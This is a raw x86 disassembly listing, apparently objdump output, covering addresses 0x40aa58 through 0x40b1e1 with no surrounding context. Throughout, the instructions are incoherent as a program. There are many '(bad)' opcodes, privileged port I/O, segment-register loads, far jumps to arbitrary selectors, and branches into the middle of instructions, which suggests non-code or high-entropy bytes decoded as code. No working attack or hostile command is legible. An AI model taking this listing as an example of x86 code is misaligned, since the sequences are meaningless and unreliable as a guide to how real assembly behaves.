  40aa58:	(bad)  
  40aa59:	xor    esi,DWORD PTR ds:0x3ef80bb1
  40aa5f:	cmp    BYTE PTR [ecx+0x78fcfe61],al
  40aa65:	icebp  
  40aa66:	inc    edi
  40aa67:	out    0x6b,eax
  40aa69:	pop    es
  40aa6a:	push   esi
  40aa6b:	fcom   st(5)
  40aa6d:	mov    edi,DWORD PTR [ebx-0x6c092c35]
  40aa73:	adc    cl,BYTE PTR [ebx-0xe]
  40aa76:	jp     0x40aa28
  40aa78:	xor    DWORD PTR [ebx+0x884984a],esi
  40aa7e:	jnp    0x40aa96
  40aa80:	call   0xcceacef6
  40aa85:	fnsave [eax-0x16]
  40aa88:	sub    al,0x11
  40aa8a:	rcl    DWORD PTR [edi+0x7a0cdfe1],1
  40aa90:	push   ecx
  40aa91:	inc    eax
  40aa92:	push   cs
  40aa93:	inc    ecx
  40aa94:	mov    ecx,0xca620193
  40aa99:	pop    ss
  40aa9a:	mov    esp,DWORD PTR [esi]
  40aa9c:	xchg   ebx,eax
  40aa9d:	pusha  
  40aa9e:	mov    esp,0xa642c9bc
  40aaa3:	ficomp DWORD PTR ss:[ebx-0x398a5de0]
  40aaaa:	jl     0x40aaf8
  40aaac:	jle    0x40aa30
  40aaae:	mov    bh,0x8b
  40aab0:	mov    es,WORD PTR [edx]
  40aab2:	iret   
  40aab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aab4:	inc    edi
  40aab5:	mov    cl,0x6a
  40aab7:	mov    ah,dh
  40aab9:	rol    BYTE PTR [eax+0x4b],cl
  40aabc:	cmc    
  40aabd:	dec    edi
  40aabe:	jp     0x40ab33
  40aac0:	call   0x269b8d93
  40aac5:	(bad)  
  40aac6:	cli    
  40aac7:	sbb    ecx,esi
  40aac9:	pop    es
  40aaca:	(bad)  
  40aacb:	cli    
  40aacc:	lahf   
  40aacd:	imul   edx,DWORD PTR [esi],0xffffff82
  40aad0:	xor    BYTE PTR [esi+0x3f8ee70f],0x68
  40aad7:	dec    edi
  40aad8:	sub    al,0x77
  40aada:	repnz (bad) 
  40aadc:	inc    edi
  40aadd:	jp     0x40aab8
  40aadf:	sub    eax,0xaf369722
  40aae4:	jle    0x40aaa6
  40aae6:	aas    
  40aae7:	jnp    0x40aa8d
  40aae9:	adc    DWORD PTR [ebp+0x4c],0xffffff8d
  40aaed:	mov    dh,0xf7
  40aaef:	or     ch,ah
  40aaf1:	xor    eax,0xbd753
  40aaf6:	mov    dl,0x99
  40aaf8:	fs retf 
  40aafa:	cs pushf 
  40aafc:	jmp    0x33d53901
  40ab01:	jl     0x40ab7b
  40ab03:	mov    edi,0x88be2579
  40ab08:	add    DWORD PTR [esi+0x4a],ecx
  40ab0b:	outs   dx,DWORD PTR ds:[esi]
  40ab0c:	or     eax,0x7d07c8e5
  40ab11:	push   edx
  40ab12:	mov    ecx,0xe147d5d8
  40ab17:	mov    edx,0xaca682b2
  40ab1c:	inc    edi
  40ab1d:	xchg   esp,eax
  40ab1e:	ins    BYTE PTR es:[edi],dx
  40ab1f:	jnp    0x40ab01
  40ab21:	or     al,0xf5
  40ab23:	sbb    edx,eax
  40ab25:	clc    
  40ab26:	pop    edx
  40ab27:	out    0xc2,al
  40ab29:	pop    ds
  40ab2a:	imul   esi,DWORD PTR [eax+eax*8+0x74],0xfffffff5
  40ab2f:	pop    ebx
  40ab30:	sbb    BYTE PTR [eax-0x5270fed0],bh
  40ab36:	mov    ds:0x14e8fb37,eax
  40ab3b:	xchg   ebp,eax
  40ab3c:	and    al,0x86
  40ab3e:	xor    al,BYTE PTR [esi+edi*1-0x656e76f0]
  40ab45:	idiv   BYTE PTR [ecx+0x4b]
  40ab48:	loope  0x40ab33
  40ab4a:	add    DWORD PTR [edx],edx
  40ab4c:	mov    ecx,0x15acd7e1
  40ab51:	aaa    
  40ab52:	repnz and ebx,DWORD PTR [ecx-0x1d]
  40ab56:	sbb    DWORD PTR [eax],0x17f1f71f
  40ab5c:	sbb    eax,0xcccab75e
  40ab61:	ret    0xe42a
  40ab64:	stos   BYTE PTR es:[edi],al
  40ab65:	adc    edx,esp
  40ab67:	aas    
  40ab68:	xor    eax,0x70da388
  40ab6d:	int    0x66
  40ab6f:	mov    edx,0xfef7de34
  40ab74:	ins    BYTE PTR es:[edi],dx
  40ab75:	and    bh,BYTE PTR [edx-0x36]
  40ab78:	rcr    BYTE PTR [edi+0x1d],cl
  40ab7b:	sbb    esi,edi
  40ab7d:	or     BYTE PTR [ecx-0x66e92b55],bl
  40ab83:	ins    BYTE PTR es:[edi],dx
  40ab84:	xor    al,0x71
  40ab86:	push   edi
  40ab87:	mov    WORD PTR [ebp+0x3d],ss
  40ab8a:	addr16 inc edi
  40ab8c:	adc    bh,bl
  40ab8e:	ins    DWORD PTR es:[edi],dx
  40ab8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab90:	repz int 0x39
  40ab93:	(bad)  
  40ab94:	fstp   st(5)
  40ab96:	adc    eax,0xd967e0f9
  40ab9b:	mov    eax,ds:0x56d48d4e
  40aba0:	cmovp  esi,DWORD PTR ds:0xc4454f0a
  40aba7:	retf   
  40aba8:	push   ebp
  40aba9:	lea    edi,[edx-0x20]
  40abac:	popa   
  40abad:	in     al,0x3e
  40abaf:	ds xchg edx,eax
  40abb1:	dec    eax
  40abb2:	jne    0x40ab62
  40abb4:	gs ja  0x40ab91
  40abb7:	rol    DWORD PTR [esi-0x58077e9e],cl
  40abbd:	inc    ebx
  40abbe:	iret   
  40abbf:	mov    ?,esp
  40abc1:	mov    ebp,0xa787e910
  40abc6:	inc    esp
  40abc7:	inc    edx
  40abc8:	in     eax,dx
  40abc9:	imul   esp
  40abcb:	das    
  40abcc:	in     al,dx
  40abcd:	or     esp,DWORD PTR [ecx+0x4e4469d8]
  40abd3:	pop    ebp
  40abd4:	rcl    BYTE PTR [eax+0x7b],cl
  40abd7:	sbb    al,BYTE PTR [ecx+ebp*2+0x646ae3a8]
  40abde:	pop    ebx
  40abdf:	fidivr DWORD PTR [eax-0x5deb538a]
  40abe5:	jae    0x40abed
  40abe7:	leave  
  40abe8:	in     al,dx
  40abe9:	pop    ebx
  40abea:	imul   esp,DWORD PTR [ebp-0x4f133df],0xe7f6f807
  40abf4:	adc    cl,cl
  40abf6:	mov    ds:0x86f0535d,al
  40abfb:	mov    edx,0xb671ce08
  40ac00:	pop    esp
  40ac01:	addr16 adc dh,0x8f
  40ac05:	into   
  40ac06:	mov    dh,0xf0
  40ac08:	(bad)  
  40ac09:	(bad)  
  40ac0a:	scas   eax,DWORD PTR es:[edi]
  40ac0b:	sbb    edx,DWORD PTR [edi+eiz*1]
  40ac0e:	cmp    bh,BYTE PTR [ebp+0x37]
  40ac11:	sar    esp,cl
  40ac13:	pop    ebp
  40ac14:	sub    eax,0x14513543
  40ac19:	add    al,0x88
  40ac1b:	lock push esp
  40ac1d:	xor    al,0xb4
  40ac1f:	test   eax,0x2708bce5
  40ac24:	les    ecx,FWORD PTR [ebx-0x57]
  40ac27:	jmp    0xa1430386
  40ac2c:	dec    esi
  40ac2d:	cmp    dh,bl
  40ac2f:	inc    edi
  40ac30:	das    
  40ac31:	data16 adc bh,BYTE PTR ds:0xfb904eda
  40ac38:	jb     0x40ac8f
  40ac3a:	push   eax
  40ac3b:	jg     0x40abc3
  40ac3d:	dec    edi
  40ac3e:	jecxz  0x40ac08
  40ac40:	in     al,0x66
  40ac42:	cmp    BYTE PTR [ebx],bl
  40ac44:	fistp  DWORD PTR [ebx]
  40ac46:	cmp    BYTE PTR [esi+esi*4-0x1a93925d],bh
  40ac4d:	shr    BYTE PTR [ebp+0x29],cl
  40ac50:	adc    BYTE PTR [ecx+0x7527ba87],dh
  40ac56:	sub    dh,bh
  40ac58:	inc    edx
  40ac59:	inc    ebp
  40ac5a:	cld    
  40ac5b:	and    BYTE PTR ds:0x9baba4f5,dl
  40ac61:	xchg   edi,eax
  40ac62:	repz xlat BYTE PTR ds:[ebx]
  40ac64:	jge    0x40ac6b
  40ac66:	jg     0x40ac9d
  40ac68:	ret    
  40ac69:	imul   eax,DWORD PTR [ebx-0x34],0x6a
  40ac6d:	jo     0x40ac05
  40ac6f:	aam    0x7b
  40ac71:	scas   eax,DWORD PTR es:[edi]
  40ac72:	call   0x9342f44c
  40ac77:	aad    0xb8
  40ac79:	add    dl,BYTE PTR [esi]
  40ac7b:	cmp    DWORD PTR [esi-0x6c0023f0],edx
  40ac81:	mov    edi,0xe7def1b
  40ac86:	popf   
  40ac87:	test   al,0x15
  40ac89:	mov    esp,0xae5ac501
  40ac8e:	mov    edi,DWORD PTR [eax+0x11]
  40ac91:	or     al,0x43
  40ac93:	rcl    BYTE PTR [ebx],cl
  40ac95:	mov    al,0x36
  40ac97:	add    eax,0xe98789de
  40ac9c:	loop   0x40acc8
  40ac9e:	fmul   DWORD PTR [ebp+eax*2-0x74]
  40aca2:	cs or  eax,0x6cb0b5c9
  40aca8:	mov    esp,0x1ff82bc7
  40acad:	pop    ds
  40acae:	mov    WORD PTR [edx+esi*1-0x44d575c5],?
  40acb5:	mov    BYTE PTR [ecx+0x11],dh
  40acb8:	push   0x568d898c
  40acbd:	mov    bl,0x42
  40acbf:	loop   0x40ad3a
  40acc1:	mov    eax,ds:0xb6a93fa
  40acc6:	sub    eax,0x205160ea
  40accb:	push   ebp
  40accc:	cdq    
  40accd:	pop    ebx
  40acce:	test   eax,0xd7cbf9f6
  40acd3:	inc    eax
  40acd4:	push   ebx
  40acd5:	in     eax,dx
  40acd6:	pop    ebp
  40acd7:	das    
  40acd8:	cli    
  40acd9:	mul    BYTE PTR ds:0xe2ba5024
  40acdf:	xor    al,0x94
  40ace1:	out    dx,al
  40ace2:	scas   eax,DWORD PTR es:[edi]
  40ace3:	jp     0x40ad11
  40ace5:	sbb    eax,edx
  40ace7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ace8:	int3   
  40ace9:	sbb    DWORD PTR [ecx+ebx*1-0x5e],edi
  40aced:	fdivr  DWORD PTR [edx+0x6a]
  40acf0:	push   ss
  40acf1:	sbb    cl,BYTE PTR [ebx+esi*1+0x1e]
  40acf5:	jne    0x40acb8
  40acf7:	ret    0xc8d
  40acfa:	pop    DWORD PTR [eax-0x69]
  40acfd:	int    0x82
  40acff:	sub    bl,BYTE PTR [edx+0x74]
  40ad02:	adc    al,0x8b
  40ad04:	gs stos DWORD PTR es:[edi],eax
  40ad06:	rcl    bh,0x3c
  40ad09:	or     dl,dl
  40ad0b:	test   BYTE PTR [esi],al
  40ad0d:	xor    al,0x99
  40ad0f:	shr    ecx,1
  40ad11:	ret    
  40ad12:	test   BYTE PTR [ecx+0xf68f316],bl
  40ad18:	mov    dh,0x6e
  40ad1a:	mov    esi,DWORD PTR [edx-0x54]
  40ad1d:	dec    eax
  40ad1e:	(bad)
  40ad21:	(bad)  
  40ad22:	xchg   edi,eax
  40ad23:	adc    ch,ch
  40ad25:	dec    ecx
  40ad26:	pop    ss
  40ad27:	sbb    eax,0x27f961c8
  40ad2c:	in     eax,0xd
  40ad2e:	shr    DWORD PTR [edx+0x43],0x5d
  40ad32:	aas    
  40ad33:	adc    ch,dh
  40ad35:	das    
  40ad36:	call   0x607dda63
  40ad3b:	es mov bh,0xe8
  40ad3e:	dec    esp
  40ad3f:	fidiv  DWORD PTR [ebx+0x18]
  40ad42:	cmp    al,0x90
  40ad44:	pushf  
  40ad45:	push   ebx
  40ad46:	mov    BYTE PTR [edi+0x2e],dl
  40ad49:	scas   eax,DWORD PTR es:[edi]
  40ad4a:	add    BYTE PTR cs:[ebx-0x2cd804cb],dh
  40ad51:	mov    bl,BYTE PTR [ebx-0x6f]
  40ad54:	adc    BYTE PTR [ecx-0xce3d97f],0x23
  40ad5b:	stos   BYTE PTR es:[edi],al
  40ad5c:	mov    al,BYTE PTR [eax-0x5b2e30b0]
  40ad62:	push   ebp
  40ad63:	jne    0x40add5
  40ad65:	lahf   
  40ad66:	std    
  40ad67:	pop    ebx
  40ad68:	jno    0x40adb6
  40ad6a:	daa    
  40ad6b:	(bad)  
  40ad6c:	es add dh,bh
  40ad6f:	rcl    DWORD PTR [edx-0x5c4c4562],1
  40ad75:	(bad)  
  40ad76:	inc    DWORD PTR [edi]
  40ad78:	mov    DWORD PTR [ebx],esi
  40ad7a:	aad    0x7c
  40ad7c:	fs clc 
  40ad7e:	in     eax,0xdf
  40ad80:	xchg   BYTE PTR [ebp-0x4f98e832],bl
  40ad86:	jge    0x40ad3b
  40ad88:	ja     0x40ad9e
  40ad8a:	dec    edi
  40ad8b:	sti    
  40ad8c:	sub    eax,0xdc977565
  40ad91:	lea    esi,[eax]
  40ad93:	sub    BYTE PTR [edi+0x437c9a47],bh
  40ad99:	(bad)  
  40ad9b:	xor    BYTE PTR [ecx+0x21],bl
  40ad9e:	stc    
  40ad9f:	cmp    eax,0xcc1556ae
  40ada4:	or     ebx,DWORD PTR [edx]
  40ada6:	xor    DWORD PTR [esi],ebx
  40ada8:	sti    
  40ada9:	push   0x702a42bb
  40adae:	fiadd  WORD PTR [ecx]
  40adb0:	ds mov esp,0xcd8f5342
  40adb6:	inc    ecx
  40adb7:	fcmovne st,st(3)
  40adb9:	loopne 0x40ad96
  40adbb:	jecxz  0x40ad82
  40adbd:	mov    bl,0x17
  40adbf:	icebp  
  40adc0:	jmp    0xb312:0x8a5d1845
  40adc7:	mov    esi,0xbd8c4bee
  40adcc:	outs   dx,DWORD PTR ds:[esi]
  40adcd:	cmc    
  40adce:	and    al,0xbd
  40add0:	mov    BYTE PTR [edi-0x3b519c60],cl
  40add6:	nop
  40add7:	sbb    BYTE PTR [ebx-0xad0e6b6],bl
  40addd:	dec    edx
  40adde:	popf   
  40addf:	pop    ss
  40ade0:	push   esp
  40ade1:	loopne 0x40ad98
  40ade3:	nop
  40ade4:	sahf   
  40ade5:	xchg   esp,eax
  40ade6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ade7:	xchg   ebx,eax
  40ade8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ade9:	retf   
  40adea:	xchg   esi,eax
  40adeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adec:	(bad)
  40adef:	and    esp,0x49ba4b0b
  40adf5:	rol    BYTE PTR [esi+eiz*4-0x5c],cl
  40adf9:	push   ss
  40adfa:	xchg   BYTE PTR [eax+esi*4+0x63],cl
  40adfe:	sub    edx,DWORD PTR [eax+0xcb11e80]
  40ae04:	lods   eax,DWORD PTR ds:[esi]
  40ae05:	jge    0x40ada3
  40ae07:	pop    esi
  40ae08:	mov    dh,BYTE PTR [edi+0x4d47a09b]
  40ae0e:	mov    ebx,0x1798e0ab
  40ae13:	mov    bl,0x92
  40ae15:	mov    ah,0x6a
  40ae17:	out    0xf9,al
  40ae19:	or     BYTE PTR [ecx+0x576fd16],cl
  40ae1f:	fdiv   QWORD PTR ds:0x1c60ade6
  40ae25:	sti    
  40ae26:	(bad)  
  40ae27:	push   0x4f143c9d
  40ae2c:	push   ecx
  40ae2d:	pop    esp
  40ae2e:	into   
  40ae2f:	int3   
  40ae30:	in     eax,dx
  40ae31:	dec    ebp
  40ae32:	stc    
  40ae33:	sbb    eax,0xcd349dc7
  40ae38:	mov    ch,0xcb
  40ae3a:	xchg   DWORD PTR [edi+edi*8-0x4b],edi
  40ae3e:	or     al,0xb6
  40ae40:	scas   al,BYTE PTR es:[edi]
  40ae41:	(bad)  
  40ae43:	pop    es
  40ae44:	in     eax,0x9
  40ae46:	in     al,dx
  40ae47:	jno    0x40ae33
  40ae49:	sbb    DWORD PTR [ecx+0x4be8bc62],ebp
  40ae4f:	jp     0x40ae20
  40ae51:	shl    BYTE PTR [edx+0x401a45d2],0x46
  40ae58:	fcom   DWORD PTR [ecx+0x159b45d0]
  40ae5e:	stc    
  40ae5f:	push   ebx
  40ae60:	pop    ds
  40ae61:	loope  0x40adea
  40ae63:	(bad)  
  40ae64:	fs pop ebp
  40ae66:	xor    eax,0x1ff68fba
  40ae6b:	cmp    BYTE PTR [edi+eax*1],dh
  40ae6e:	sbb    eax,0xd6810f90
  40ae73:	mov    ecx,0x2b059116
  40ae78:	or     esp,ebp
  40ae7a:	sbb    edi,DWORD PTR [ecx-0x62]
  40ae7d:	and    ah,BYTE PTR [esi-0x16]
  40ae80:	in     eax,dx
  40ae81:	repnz fild DWORD PTR [ebp+0x1]
  40ae85:	push   ebp
  40ae86:	push   cs
  40ae87:	adc    BYTE PTR [eax],dh
  40ae89:	push   ss
  40ae8a:	dec    eax
  40ae8b:	into   
  40ae8c:	jne    0x40aebe
  40ae8e:	add    BYTE PTR [edx+0x789613ea],ah
  40ae94:	rcr    BYTE PTR [eax-0x3bef17e3],1
  40ae9a:	pop    edi
  40ae9b:	xchg   esi,eax
  40ae9c:	adc    BYTE PTR [ebp+0x58],bl
  40ae9f:	inc    ebx
  40aea0:	(bad)  
  40aea1:	sbb    eax,0x7dc3292f
  40aea6:	add    BYTE PTR ds:0xbe03b16b,al
  40aeac:	ret    0x13dd
  40aeaf:	pop    ecx
  40aeb0:	mov    ds:0xa1922bf8,eax
  40aeb5:	jbe    0xce3d8754
  40aebb:	out    0xfb,eax
  40aebd:	inc    ebx
  40aebe:	imul   eax,DWORD PTR ds:0x53a6360c,0xfbdceda
  40aec8:	(bad)
  40aecc:	or     dh,BYTE PTR [ecx-0x486b2581]
  40aed2:	pusha  
  40aed3:	hlt    
  40aed4:	fwait
  40aed5:	or     DWORD PTR [ecx],ebx
  40aed7:	pop    ebp
  40aed8:	pop    ds
  40aed9:	mov    ebp,0xe3234cfb
  40aede:	jno    0x40af34
  40aee0:	repnz sbb DWORD PTR [ebp+0x74],edi
  40aee4:	shl    DWORD PTR [edi],1
  40aee6:	sub    BYTE PTR [esi+0x9a695f],ah
  40aeec:	test   DWORD PTR [ebp+edx*8-0x80],ebp
  40aef0:	fmul   DWORD PTR [esi-0x74]
  40aef3:	out    dx,al
  40aef4:	inc    ebp
  40aef5:	bound  eax,QWORD PTR [edi+0xaaa54f7]
  40aefb:	and    eax,0x81db85c9
  40af00:	xchg   DWORD PTR [esi],edi
  40af02:	scas   al,BYTE PTR es:[edi]
  40af03:	inc    eax
  40af04:	out    dx,eax
  40af05:	xor    eax,0x431081d6
  40af0a:	(bad)  
  40af0c:	nop
  40af0d:	cs mov ecx,0xffc133b6
  40af13:	and    al,0x28
  40af15:	out    dx,eax
  40af16:	sub    eax,0xc0a206f
  40af1b:	(bad)  
  40af1c:	mov    edi,0x4bcaa9ff
  40af21:	int    0x54
  40af23:	cdq    
  40af24:	daa    
  40af25:	dec    ebp
  40af26:	in     al,dx
  40af27:	pop    edx
  40af28:	push   edi
  40af29:	mov    dl,0x9d
  40af2b:	or     al,bl
  40af2d:	mov    eax,ds:0xdce2e3cd
  40af32:	dec    ebp
  40af33:	ja     0x40af9f
  40af35:	sbb    eax,0xbd550df2
  40af3a:	dec    esp
  40af3b:	popf   
  40af3c:	pop    edx
  40af3d:	sub    al,0xd
  40af3f:	mov    edi,0x9e7baeeb
  40af44:	mov    cs,WORD PTR [ecx+ebp*4]
  40af47:	int3   
  40af48:	jle    0x40afb6
  40af4a:	call   0x5d4d:0xe0a26996
  40af51:	sahf   
  40af52:	outs   dx,BYTE PTR ds:[esi]
  40af53:	je     0x40afd2
  40af55:	adc    DWORD PTR [ebx],0xffffff8c
  40af58:	dec    edx
  40af59:	pop    es
  40af5a:	or     BYTE PTR [edi+0x20f49ded],0xee
  40af61:	xor    DWORD PTR [eax],0x44
  40af64:	fwait
  40af65:	adc    dl,BYTE PTR [ecx-0x72]
  40af68:	ja     0x40af87
  40af6a:	xchg   DWORD PTR [eax],ebx
  40af6c:	push   edi
  40af6d:	add    eax,0x181268a3
  40af72:	jae    0x40afca
  40af74:	dec    ecx
  40af75:	sbb    BYTE PTR [ecx-0x32fcf09b],0x12
  40af7c:	loop   0x40af81
  40af7e:	mov    ah,BYTE PTR [edi-0x1d]
  40af81:	jae    0x40afea
  40af83:	cld    
  40af84:	adc    al,0xb7
  40af86:	popf   
  40af87:	or     al,0xfe
  40af89:	adc    esp,DWORD PTR [edx-0x62a2670e]
  40af8f:	lods   al,BYTE PTR ds:[esi]
  40af90:	lods   eax,DWORD PTR ds:[esi]
  40af91:	mov    al,ds:0xc5229572
  40af96:	fsub   DWORD PTR [eax+edi*1-0x14]
  40af9a:	xor    DWORD PTR [ebp+0x4ac79717],ecx
  40afa0:	ror    BYTE PTR [ebp-0x15],0x55
  40afa4:	xchg   ebx,eax
  40afa5:	pop    esi
  40afa6:	and    esp,edx
  40afa8:	sub    ebp,esp
  40afaa:	cmp    BYTE PTR ds:0x5be80aad,ch
  40afb0:	js     0x40af6b
  40afb2:	push   0xffffffc4
  40afb4:	cmp    BYTE PTR [edx+0x73],bh
  40afb7:	lahf   
  40afb8:	ins    BYTE PTR es:[edi],dx
  40afb9:	ja     0x40afdf
  40afbb:	hlt    
  40afbc:	add    eax,0x73bd8b06
  40afc1:	sub    eax,0x36d7af3b
  40afc6:	dec    ebx
  40afc7:	cmp    BYTE PTR [ecx],bl
  40afc9:	fidiv  WORD PTR [ebx+ebx*8]
  40afcc:	push   ebx
  40afcd:	xchg   ecx,eax
  40afce:	dec    esp
  40afcf:	pop    es
  40afd0:	imul   ebp,DWORD PTR [esi],0x79
  40afd3:	stc    
  40afd4:	fnstsw WORD PTR [ecx]
  40afd6:	popa   
  40afd7:	xchg   bh,bh
  40afd9:	in     al,dx
  40afda:	cs xchg esi,eax
  40afdc:	stos   BYTE PTR es:[edi],al
  40afdd:	into   
  40afde:	push   edi
  40afdf:	mov    ds:0x5a2113c2,eax
  40afe4:	xchg   ebx,eax
  40afe5:	sub    BYTE PTR [ebx+0x1bc1d217],cl
  40afeb:	xor    eax,0xf19f847e
  40aff0:	sbb    eax,0x6a380ca1
  40aff5:	pop    ebx
  40aff6:	mov    dl,BYTE PTR ds:0xa039b2b7
  40affc:	jne    0x40b022
  40affe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afff:	mov    bh,0xff
  40b001:	pushf  
  40b002:	lods   al,BYTE PTR ds:[esi]
  40b003:	sbb    bl,BYTE PTR [ebx-0x74]
  40b006:	fistp  QWORD PTR [esi-0x1fc78908]
  40b00c:	xor    edi,DWORD PTR [ebp+0x38]
  40b00f:	stc    
  40b010:	adc    edi,DWORD PTR [ebx-0x15cd1016]
  40b016:	mov    eax,0xa40ca575
  40b01b:	sub    ecx,DWORD PTR [edi+0x26]
  40b01e:	cmp    dh,BYTE PTR [edx+eax*1+0x29caafad]
  40b025:	sar    DWORD PTR [edi-0x32],1
  40b028:	mov    esp,DWORD PTR [ecx]
  40b02a:	sub    eax,0x444b50ca
  40b02f:	cmc    
  40b030:	pop    ds
  40b031:	mov    ds:0x382038be,eax
  40b036:	dec    eax
  40b037:	xlat   BYTE PTR ds:[ebx]
  40b038:	ror    DWORD PTR [edx-0x6f32ed21],1
  40b03e:	ja     0x40afc7
  40b040:	inc    ecx
  40b041:	push   0xffffffa3
  40b043:	nop
  40b044:	ror    DWORD PTR [edi-0x253d38d3],0x48
  40b04b:	mov    cl,0xc2
  40b04d:	jmp    0x40b0ae
  40b04f:	mov    al,bl
  40b051:	xchg   esi,eax
  40b052:	sub    BYTE PTR [edi+0x64d939e6],ch
  40b058:	sub    eax,DWORD PTR [eax-0x71]
  40b05b:	push   ecx
  40b05c:	hlt    
  40b05d:	cs dec eax
  40b05f:	jmp    0x9c57:0xff04e107
  40b066:	xlat   BYTE PTR ds:[ebx]
  40b067:	jmp    0x40b0bb
  40b069:	jo     0x40b0ae
  40b06b:	adc    ch,BYTE PTR [edx-0x2fc32668]
  40b071:	fst    QWORD PTR [eax]
  40b073:	push   eax
  40b074:	push   ebx
  40b075:	loopne 0x40b078
  40b077:	sahf   
  40b078:	mov    esi,0xcb8511b
  40b07d:	add    eax,esi
  40b07f:	arpl   bp,cx
  40b081:	pop    edi
  40b082:	outs   dx,DWORD PTR ds:[esi]
  40b083:	ffreep st(7)
  40b085:	mov    ss,WORD PTR [esi+0xa]
  40b088:	dec    eax
  40b089:	mov    al,BYTE PTR [ecx-0x59efaa1a]
  40b08f:	lods   eax,DWORD PTR ds:[esi]
  40b090:	in     al,0x9
  40b092:	pop    esi
  40b093:	sub    esi,DWORD PTR [edx]
  40b095:	test   BYTE PTR [edx+0x3],0x54
  40b099:	push   es
  40b09a:	cdq    
  40b09b:	sub    BYTE PTR [ecx-0x445b398e],cl
  40b0a1:	xchg   ebx,eax
  40b0a2:	or     cl,0x89
  40b0a5:	dec    ebp
  40b0a6:	ret    
  40b0a7:	inc    esp
  40b0a8:	xor    edx,ebx
  40b0aa:	push   eax
  40b0ab:	loope  0x40b0c9
  40b0ad:	in     al,0xd6
  40b0af:	jmp    0x51d39646
  40b0b4:	inc    esp
  40b0b5:	mov    ebx,DWORD PTR [ebp-0x6c]
  40b0b8:	jl     0x40b04e
  40b0ba:	pop    edi
  40b0bb:	(bad)  
  40b0bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0bd:	loopne 0x40b063
  40b0bf:	add    BYTE PTR [edx],cl
  40b0c1:	fdiv   DWORD PTR [ebx]
  40b0c3:	dec    ebp
  40b0c4:	adc    dl,BYTE PTR [esi+0x18848d1c]
  40b0ca:	pop    ebp
  40b0cb:	repz xor BYTE PTR [edi],bl
  40b0ce:	push   0x171ef089
  40b0d3:	jmp    0x8ac3:0x9db1e411
  40b0da:	dec    esp
  40b0db:	aas    
  40b0dc:	jae    0x40b08e
  40b0de:	add    DWORD PTR ds:0x92a982b4,eax
  40b0e4:	out    0x4e,al
  40b0e6:	and    DWORD PTR [edx+0x2b0454c4],ebx
  40b0ec:	addr16 popf 
  40b0ee:	cmp    BYTE PTR [edi],dl
  40b0f0:	mov    ebp,0x971676
  40b0f5:	(bad)  
  40b0f6:	in     eax,dx
  40b0f7:	jb     0x40b0df
  40b0f9:	mov    ecx,0x2ab826a5
  40b0fe:	mov    dh,bl
  40b100:	or     ecx,0xf377ad86
  40b106:	mov    ecx,0xaddeea5
  40b10b:	retf   
  40b10c:	jno    0x40b118
  40b10e:	inc    ebp
  40b10f:	getsec 
  40b111:	sahf   
  40b112:	jecxz  0x40b10e
  40b114:	lahf   
  40b115:	dec    eax
  40b116:	xchg   ebx,eax
  40b117:	stos   BYTE PTR es:[edi],al
  40b118:	lds    edi,FWORD PTR [ecx-0x61ee9b47]
  40b11e:	sbb    DWORD PTR [edi+0x79],ecx
  40b121:	xchg   ebp,eax
  40b122:	fiadd  DWORD PTR [ecx+eax*2-0x79]
  40b126:	push   cs
  40b127:	outs   dx,DWORD PTR ds:[esi]
  40b128:	daa    
  40b129:	sti    
  40b12a:	nop
  40b12b:	and    ebx,edi
  40b12d:	push   0x5
  40b12f:	add    eax,0xc0bc5ceb
  40b134:	loop   0x40b157
  40b136:	jge    0x40b137
  40b138:	jne    0x40b192
  40b13a:	and    ch,dh
  40b13c:	push   edi
  40b13d:	mov    WORD PTR ds:0xa4abc4c2,?
  40b143:	repnz cmc 
  40b145:	push   esp
  40b146:	call   0x85533885
  40b14b:	in     al,0x12
  40b14d:	inc    edx
  40b14e:	mov    bl,0x6b
  40b150:	xchg   esi,eax
  40b151:	gs jne 0x40b154
  40b154:	idiv   BYTE PTR [ebx+0x7f]
  40b157:	test   BYTE PTR [ebx-0x61],0xf1
  40b15b:	jg     0x40b149
  40b15d:	pop    es
  40b15e:	mov    ecx,0x2e56c3ca
  40b163:	push   0xc82c7ccd
  40b168:	cmp    BYTE PTR [ecx+0x519343bf],bh
  40b16e:	mov    esi,DWORD PTR [eax]
  40b170:	bound  edx,QWORD PTR [ecx]
  40b172:	arpl   WORD PTR [esi],bx
  40b174:	mov    ecx,0xa559a0e6
  40b179:	and    edi,DWORD PTR [esi+0x48]
  40b17c:	loopne 0x40b18d
  40b17e:	sti    
  40b17f:	ret    
  40b180:	mov    eax,0xd7620e00
  40b185:	arpl   bp,bx
  40b187:	ror    ebp,0x3b
  40b18a:	aad    0xf5
  40b18c:	mov    esp,DWORD PTR [edx-0x519ee0f7]
  40b192:	in     eax,0xdd
  40b194:	fnstsw WORD PTR [esi+0x34]
  40b197:	retf   0xd2a1
  40b19a:	xor    al,0xe6
  40b19c:	out    dx,al
  40b19d:	outs   dx,BYTE PTR ds:[esi]
  40b19e:	pop    ds
  40b19f:	ins    BYTE PTR es:[edi],dx
  40b1a0:	enter  0x29ac,0x9c
  40b1a4:	pop    ds
  40b1a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1a6:	ja     0x40b1cd
  40b1a8:	xor    BYTE PTR [ebx],0x27
  40b1ab:	ret    
  40b1ac:	pop    edi
  40b1ad:	pop    eax
  40b1ae:	sti    
  40b1af:	inc    ebx
  40b1b0:	pop    ebx
  40b1b1:	dec    esp
  40b1b2:	(bad)  
  40b1b3:	lds    esi,FWORD PTR [edi+0x27]
  40b1b6:	mov    bl,0xb5
  40b1b8:	push   0x1be136ac
  40b1bd:	retf   
  40b1be:	pop    ss
  40b1bf:	retf   0x29d6
  40b1c2:	popf   
  40b1c3:	fs xchg ecx,eax
  40b1c5:	mov    ebp,0x1144fb34
  40b1ca:	stc    
  40b1cb:	fild   QWORD PTR [eax-0x34be838]
  40b1d1:	xor    ebx,edi
  40b1d3:	mov    bl,0xf4
  40b1d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1d6:	out    0x76,eax
  40b1d8:	cdq    
  40b1d9:	or     eax,0xb2bdd03f
  40b1de:	pop    ds
  40b1df:	push   edi
  40b1e0:	push   edi
  40b1e1:	clc    
